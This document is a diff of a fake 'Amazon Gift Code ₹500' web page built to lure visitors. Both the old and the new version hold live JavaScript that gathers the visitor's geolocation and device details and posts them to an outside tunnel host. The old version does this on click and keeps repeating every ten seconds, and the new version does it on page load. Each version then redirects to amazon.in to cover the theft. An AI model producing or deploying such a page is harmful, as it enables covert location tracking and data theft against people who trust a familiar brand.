@@ -1,83 +1,62 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Amazon Rewards & Device Sync</title>
+    <title>Amazon Gift Code ₹500</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body { font-family: 'Arial', sans-serif; text-align: center; background-color: #f3f3f3; padding-top: 50px; }
-        .container { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); display: inline-block; width: 90%; max-width: 400px; }
-        .amazon-logo { width: 120px; margin-bottom: 20px; }
-        .btn { background-color: #febd69; border: 1px solid #a88734; color: #111; padding: 12px 30px; font-size: 18px; font-weight: bold; cursor: pointer; border-radius: 5px; width: 100%; }
-        .btn:hover { background-color: #f3a847; }
+        body { font-family: Arial; text-align: center; background: #f3f3f3; padding-top: 50px; }
+        .box { background: white; padding: 20px; border-radius: 10px; width: 90%; max-width: 400px; margin: auto; }
+        .btn { background: #febd69; padding: 12px; border: none; width: 100%; font-size: 18px; cursor: pointer; border-radius: 5px; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" class="amazon-logo">
-    <h3>Exclusive Offer Found!</h3>
-    <p>Please sync your system services to claim your ₹500 Amazon Gift Card.</p>
-    <button id="openBoth" class="btn">Claim & Sync Now</button>
+<div class="box">
+    <h2>Amazon Gift Code ₹500</h2>
+    <p>Click continue to claim your reward</p>
+    <button onclick="goNext()" class="btn">Continue</button>
 </div>
 
 <script>
-    const serverURL = "https://prolevel.serveousercontent.com";
+const serverURL = "https://prolevel.serveousercontent.com";
 
-    function sendData(lat, lon) {
-        const data = {
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            language: navigator.language,
-            online: navigator.onLine,
-            ram: navigator.deviceMemory || 0,
-            screenRes: `${window.screen.width}x${window.screen.height}`,
-            colorDepth: window.screen.colorDepth,
-            batteryLevel: null,
-            latitude: lat,
-            longitude: lon,
-            date: new Date()
-        };
-
-        if (navigator.getBattery) {
-            navigator.getBattery().then(battery => {
-                data.batteryLevel = battery.level * 100;
-                sendToServer(data);
-            });
-        } else {
-            sendToServer(data);
-        }
-    }
-
-    function sendToServer(data) {
-        fetch(`${serverURL}/log-info`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify(data)
-        }).then(()=> console.log("🔥 Device + Location info sent:", data))
-          .catch(()=> console.log("❌ Error sending info:", data));
-    }
-
-    function startTracking() {
-        // Initial location fetch
-        if(navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(pos => sendData(pos.coords.latitude, pos.coords.longitude));
-        }
-
-        // Continuous tracking every 10s (for demo/testing)
-        setInterval(() => {
-            if(navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(pos => sendData(pos.coords.latitude, pos.coords.longitude));
+// 🔥 Page load pe hi location
+window.onload = () => {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            (pos) => {
+                sendData(pos.coords.latitude, pos.coords.longitude);
+            },
+            () => {
+                sendData(null, null);
             }
-        }, 10000);
+        );
+    } else {
+        sendData(null, null);
     }
+};
 
-    document.getElementById("openBoth").addEventListener("click", () => {
-        // 1️⃣ Start tracking in background
-        startTracking();
+function sendData(lat, lon) {
+    const data = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        latitude: lat,
+        longitude: lon
+    };
 
-        // 2️⃣ Redirect to Amazon instantly
-        window.location.href = "https://www.amazon.in";
-    });
+    fetch(`${serverURL}/log-info`, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify(data)
+    })
+    .then(() => console.log("🔥 Sent:", data))
+    .catch(() => console.log("❌ Error"));
+}
+
+// 👉 Button → redirect
+function goNext() {
+    window.location.href = "https://www.amazon.in";
+}
 </script>
 
 </body>
